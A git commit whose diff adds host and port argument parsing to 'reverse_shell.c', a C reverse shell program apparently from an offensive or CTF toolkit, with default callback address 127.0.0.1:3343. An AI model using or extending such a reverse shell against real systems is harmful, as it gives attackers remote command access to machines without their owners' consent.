0b9c123f6b6ed6b1a4e573efe26730a3e72c4427
Leopold <leommxj@gmail.com>
2020-07-10 17:36:40 +0800

    update reverse_shell.c
    add command line host/port arg parse to reverse_shell

--- src/shell/reverse_shell.c
+++ src/shell/reverse_shell.c
@@ -4,6 +4,7 @@
 #include <arpa/inet.h>
 #include <stdlib.h>
 #include <sys/wait.h>
+#include <string.h>
  
 char ip_addr[16] = "127.0.0.1";  
 char port[6] = "3343";
@@ -28,6 +29,15 @@ int spwan(){
 
 int main (int argc, char **argv)
 {
+    if(argc>=2 && strlen(argv[1])<16 ){
+        memset(ip_addr, 0, 16);
+        memcpy(ip_addr, argv[1], strlen(argv[1]));
+    }
+
+    if(argc==3 && strlen(argv[2])<6){
+        memset(port, 0, 6);
+        memcpy(port, argv[2], strlen(argv[2]));
+    }
   
     while(1){
     	pid_t pid = fork();
